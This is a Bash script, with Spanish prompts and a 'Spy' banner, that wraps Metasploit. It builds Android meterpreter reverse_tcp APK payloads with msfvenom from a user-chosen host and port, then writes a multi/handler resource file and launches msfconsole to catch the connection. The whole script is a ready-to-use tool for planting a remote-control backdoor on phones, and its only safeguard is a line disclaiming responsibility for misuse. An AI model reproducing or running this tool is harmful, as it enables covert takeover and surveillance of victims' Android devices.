#!/bin/bash
if [ -x /bin/msfconsole ]
then
echo -e "\e[36m
        ██████  ██▓███ ▓██   ██▓                           
      ▒██    ▒ ▓██░  ██▒▒██  ██▒                           
      ░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                           
        ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                           
      ▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                           
      ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒                            
      ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                            
      ░  ░  ░  ░░       ▒ ▒ ░░                             
            ░           ░ ░                                
                        ░ ░"
echo -e "\e[31m---------> \e[1mNo somos responsable del mal uso.\e[0m"
echo
while :;
do
echo -en "\e[36m$(date | awk '{print $4}') [ Spy ]\e[1m \e[0m"
read spy
if [[ $spy == "android" ]]
then
if [ -e *.log ]
then
name=$(cat *.log)
echo -e "\e[32mBienvenido SR \e[2m$name\e[0m. Comandos:"
echo -e "
\e[31;1m->\e[0m \e[36mpayload \e[2mhost port name\e[0m
\e[31;1m->\e[0m \e[36mactived \e[2mhost port name\e[0m
"

while :;
do
echo -en "\e[36;2m[ Spy/\e[4m$name\e[0m\e[36;2m ]\e[0m "
read spy
if [[ $spy == "payload" ]]
then
echo -e "\e[36;2m[ Spy/\e[4m$name\e[0m\e[36;2m ]\e[32;1m Iniciando Progama de Creacion\e[0m"
sleep 5
echo -en "\e[31;1m>\e[0m \e[36menter\e[2m localhost:\e[0m "
read host
echo -en "\e[31;1m>\e[0m \e[36menter\e[2m portname:\e[0m "
read port
echo -en "\e[31;1m>\e[0m \e[36menter\e[2m payname:\e[0m "
read pay
echo -e "\e[36;2m[ Spy/\e[4m$name\e[0m\e[36;2m ]\e[32;1m Creando payload llamado $pay.apk\e[0m"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > $pay.apk
elif [[ $spy == "actived" ]]
then
echo -e "\e[36;2m[ Spy/\e[4m$name\e[0m\e[36;2m ]\e[32;1m Iniciando Progama de Conexion\e[0m"
sleep 5
echo -en "\e[31;1m>\e[0m \e[36menter\e[2m localhost:\e[0m "
read host
echo -en "\e[31;1m>\e[0m \e[36menter\e[2m portname:\e[0m "
read port
echo -en "\e[31;1m>\e[0m \e[36menter\e[2m payname:\e[0m "
read pay
echo -e "\e[36;2m[ Spy/\e[4m$name\e[0m\e[36;2m ]\e[32;1m Conectando al payload llamado $pay.apk\e[0m"
echo "use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost $host
set lport $port
run " > $pay.rc
msfconsole -q -r $pay.rc
else
echo -en
fi
done
else
echo -en "\e[31;1mNo esta logeado, \e[32;1mIngrese su nombre:\e[0m "
read nombre
echo "$nombre" >> $nombre.log; chmod 755 *.log
fi
else
echo -e "Ingrese el comando android."
fi
done
else
echo -e "\e[31;1m _____
| ____|_ __ _ __ ___  _ __
|  _| | '__| '__/ _ \| '__|
| |___| |  | | | (_) | |
|_____|_|  |_|  \___/|_| \e[0m"
echo -e "\e[31;1mError, Usted no cuenta con Metasploit Framework.\e[0m"
fi

